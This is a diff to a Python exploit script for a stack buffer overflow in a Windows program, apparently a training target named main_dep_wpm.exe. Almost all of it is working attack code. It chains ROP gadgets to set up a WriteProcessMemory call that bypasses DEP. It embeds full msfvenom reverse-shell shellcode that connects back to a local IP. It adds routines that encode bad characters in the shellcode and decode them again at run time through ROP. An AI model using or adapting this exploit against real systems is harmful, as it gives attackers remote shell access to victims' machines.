@@ -57,22 +57,107 @@ print("    -- " + hex(base))
 # ===
 
 size = 5000
-ropSize = 500
+ropSize = 1000
 
 # ===
 
-# Bad Characters
-# = 0x00 0x0a 0x20 0x28 0x80 0x81 0x86
+# Bad Characters: "\x00\x0a\x20\x80\x81\x86"
+# Custom Encode Mapping:
+# \x00 -> \xff
 
-# Reverse Shell
-# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.110LPORT=4443 -b "\x00\x0a\x20\x80\x81\x86" EXITFUNC=thread -f python -v shellcode
-# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD payload/windows/shell_reverse_tcp; set LHOST 192.168.1.110; set lport 4443; exploit"
+# Non Encoded Reverse Shell
+# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.110 LPORT=4443 -f python -v shellcode
+shellcode =  b""
+shellcode += b"\x90" * 20
+shellcode += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2"
+shellcode += b"\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x0f"
+shellcode += b"\xb7\x4a\x26\x31\xff\x8b\x72\x28\x31\xc0\xac"
+shellcode += b"\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
+shellcode += b"\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c"
+shellcode += b"\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0"
+shellcode += b"\x8b\x58\x20\x01\xd3\x8b\x48\x18\x50\x85\xc9"
+shellcode += b"\x74\x3c\x49\x31\xff\x8b\x34\x8b\x01\xd6\x31"
+shellcode += b"\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4"
+shellcode += b"\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58"
+shellcode += b"\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01"
+shellcode += b"\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
+shellcode += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
+shellcode += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00"
+shellcode += b"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
+shellcode += b"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29"
+shellcode += b"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a"
+shellcode += b"\x0a\x68\xc0\xa8\x01\x6e\x68\x02\x00\x11\x5b"
+shellcode += b"\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68"
+shellcode += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57"
+shellcode += b"\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a"
+shellcode += b"\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a"
+shellcode += b"\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
+shellcode += b"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
+shellcode += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
+shellcode += b"\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
+shellcode += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28"
+shellcode += b"\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b"
+shellcode += b"\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61"
+shellcode += b"\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
+shellcode += b"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6"
+shellcode += b"\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53"
+shellcode += b"\xff\xd5"
 
-shellcode = b'\x89\xe5\x81\xc4\xf0\xf9\xff\xff\xeb\x06^\x89u\x04\xebP\xe8\xf5\xff\xff\xff`1\xc9d\x8bq0\x8bv\x0c\x8bv\x1cV\x8b^\x08\x0f\xb6F\x1e\x89E\xf8\x8bC<\x8b|\x03x\x01\xdf\x8bO\x18O\x8bG!G\x01\xd8\x89E\xfc\xe3\x1dI\x8bE\xfc\x8b4\x88\x01\xde1\xc0\x8bU\xf8\xfc\xac\x84\xc0t\x0e\xc1\xca\x05\x01\xc2\xeb\xf4\xeb+^\x8b6\xeb\xbb;T$(u\xd6\x8bW$\x01\xdaf\x8b\x0cJ\x8bW\x1c\x01\xda\x8b\x04\x8a\x01\xd8L\x89D$!D^aYZQ\xff\xe0\xb8\xb4\xb3\xff\xfe\xf7\xd8Ph32.DhWS2_Th\x92\xacm\xcc\xffU\x04\x89\xe01\xc9f\xb9\x90\x05)\xc8P1\xc0f\xb8\x02\x02Ph\xc8\xcb\xa7;\xffU\x041\xc0PPP\xb0\x06P,\x05P@Ph\x19\xe9\xd9/\xffU\x04\x89\xc61\xc0PPh\xc0\xa8\x01nf\xb8\x11[\xc1\xe0\x10f\x83\xc0\x02PT_1\xc0PPPP\x04\x10PWVh\x0b\x99\xe0\xa7\xffU\x04VVV1\xc0\x8dH\rP\xe2\xfd\xb0DPT_f\xc7G,\x01\x01\xb8\x9b\x87\x9a\xff\xf7\xd8Phcmd.\x89\xe3\x89\xe01\xc9f\xb9\x90\x03)\xc8PW1\xc0PPP@PHPPSPh\xd9zI\x06\xffU\x041\xc9Qj\xffh\xce\x83\xcbg\xffU\x04'
+def mapBadChars(shellcode):
+    BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
+    i = 0
+    badIndex = []
+    while i < len(shellcode):
+        for c in BADCHARS:
+            if shellcode[i] == c:
+                badIndex.append(i)
+        i=i+1
+    return badIndex
 
-# ===
 
-rop = [
+def encodeShellcode(shellcode):
+    BADCHARS     = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
+    REPLACECHARS = b"\xff\x10\x06\x07\x08\x05\x1f"
+    encodedShell = shellcode
+    for i in range(len(BADCHARS)):
+        encodedShell = encodedShell.replace(pack("B", BADCHARS[i]), pack("B", REPLACECHARS[i]))
+    return encodedShell
+
+
+pos = mapBadChars(shellcode)
+encodedShellcode = encodeShellcode(shellcode)
+
+def decodeShellcode(pos, shellcode):
+    BADCHARS   = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
+    CHARSTOADD = b"\x01\xf9\x04\x04\x04\x08\x01"
+    restoreRop = b""
+
+    last_pos = 0    # Start from beginning
+
+    for i in range(len(pos)):
+        current_pos = pos[i]
+        offset = pos[i] - last_pos
+        last_pos = pos[i]
+        #neg_offset = (-offset) & 0xffffffff
+
+        value = 0
+        for j in range(len(BADCHARS)):
+            if shellcode[pos[i]] == BADCHARS[j]:
+                value = CHARSTOADD[j]
+        value = (value << 8) | 0x11110011    # ______bhbl
+
+        # Shellcode is in EDX
+        restoreRop += pack("<I", 0x4040f3)   # pop ecx ; ret
+        restoreRop += pack("<I", offset)
+        restoreRop += pack("<I", 0x401ff3)   # add edx, ecx ; ret
+        restoreRop += pack("<I", 0x402ce8)   # mov eax, edx ; ret
+        restoreRop += pack("<I", 0x402193)   # pop ebx ; ret
+        restoreRop += pack("<I", value)      # values in BH
+        restoreRop += pack("<I", 0x405ca4)   # add byte [eax], bh ; ret 
+        restoreRop += pack("<I", 0x40eb7d)   # mov edx, eax ; mov eax, edx ; ret
+    return restoreRop
+
+rop_wpm = [
 # 1. Get ESP (in eax)
     0x402ac9,       # xor eax, eax ; ret
                     # Sets EAX to 0
@@ -85,7 +170,7 @@ rop = [
 # 2. Get dummy call addr (in ebx)
     0x4040f3,       # pop ecx ; ret
                     # EAX has the value of saved ESP.
-    0x1ec,          # EAX(ESP) + 0x1ec(ECX) = skeleton value 'aaaa'
+    0x4d0,          # EAX(ESP) + 0x1ec = skeleton value 'aaaa'
                     # 'aaaa' = 0x010d78cc  (0x61616161)
 
 
@@ -133,16 +218,7 @@ rop = [
                     # Result: EAX contains the address of the shellcode
                     #         EBX points to skeleton call address. (0x61616161 = 0x75ac81b0)
 
-
-# 6. 0x62626262 Get dummy call addr + 0x4 (in ebx) Ret parameter
-
-                    # Result: EBX is on skeleton call + 4 (0x62626262)
-
-# 7. Write shellcode addr to dummy + 0x4 Ret parameter
-#    0x401fe7,       # mov [ebx], eax ; ret
-                    # Results: Shellcode is written to 0x62626262
-
-# 8. 0x64646464 Get dummy call addr + 0x10 (in ebx)
+# 6. 0x64646464 Get dummy call addr + 0x10 (in ebx)
     0x401fef,       # add ebx, 0x4 ; ret
     0x401fef,       # add ebx, 0x4 ; ret
     0x401fef,       # add ebx, 0x4 ; ret
@@ -154,11 +230,12 @@ rop = [
                     #          lpBaseAddress is done (0x00491d10)
                     #          (NO ASLR in main_dep_wpm.exe module)
 
-# 9. Get dummy call addr + 0x10 (in ebx)
+# 7. Get dummy call addr + 0x10 (in ebx)
     0x401fe7,       # mov [ebx], eax
                     # 0x011678e8 Shellcode Stack Address (src)
 
-# 10. 0x64646464 Get skeleton call addr + 0x14
+
+# 8. 0x64646464 Get skeleton call addr + 0x14
     0x401fef,       # add ebx, 0x4 ; ret
     0x401fef,       # add ebx, 0x4 ; ret
                     # Results: EBX is on skeleton call + 0x14 (0x66666666)
@@ -167,27 +244,27 @@ rop = [
                     # All Skeleton values completed
                     # End   of ROP 1
                     # Start of ROP 2
-                    # ROP 2 will decode the encoded shellcode to return original bad characters.
-                    # Encoding is done to not break the exploit with bad characters. 
-                    # Encoding breaks the exploit, but allows most of it to pass through.
-                    # Decoding is done to return the shellcode to its functional state again.
+                    # ROP 2 will encode the shellcode to replace bad characters
                     # bad characters: 0x00 0x0a 0x20 0x28 0x80 0x81 0x86
 
+]
+rop_wpm = b"".join([pack("<I", r) for r in rop_wpm])
 
-# 11. Align esp with dummy call (ebx-8)
+rop_decode = decodeShellcode(pos, shellcode)
+
+rop_align = [
+# #. Align esp with dummy call (ebx-8)
     0x4040f3,       # pop ecx
-    0xffffffe4,     # 0xffffffe4    = -0x1c (-28)
+    0xfffffe80,     # 0xffffffe4    = -0x1c (-28)
     0x401ff3,       # add edx, ecx  = edx - 0x24
     0x402ce8,       # mov eax, edx
     0x401fe0,       # mov ebx, eax
-    0x401fe3,       # xchg ebx, esp ; dec ecx ; ret
-                    # esp = WriteProcessmemory
+    0x4010f1,       # ret
+
                     # Results: Return SAVED ESP from EAX to CURRENT ESP
 
 ]
-rop = b"".join([pack("<I", r) for r in rop])
-
-# ===
+rop_align = b"".join([pack("<I", r) for r in rop_align])
 
 dummy  = b"aaaa"                # WriteProcessMemory     <- The Call
 dummy += pack("<I", 0x00410640) # Ret                    <- Ret2Code_Cave
@@ -197,15 +274,15 @@ dummy += b"dddd"                # lpBuffer               <- Shellcode (STACK) (s
 dummy += pack("<I", 0x190)      # nSize                  <- Size of Shellcode
 dummy += pack("<I", 0x00423010) # lpNumberofBytesWritten <- Some writable address
 
-# ===
 
 buf  = b"A" * 2060
-buf += rop                      # Setup WriteProcessMemory paramters
-buf += b"C" * (ropSize - len(rop))
+buf += rop_wpm                  # Setup WriteProcessMemory paramters
+buf += rop_decode               # While Shellcode in EAX, Decode Shellcode
+buf += rop_align                # Align ESP to dummy call
+buf += b"C" * (ropSize - len(rop_wpm) - len(rop_decode) - len(rop_align))
 buf += dummy
-buf += shellcode
+buf += encodedShellcode 
 
-# ===
 
 print("[+] Triggering overflow...")
 
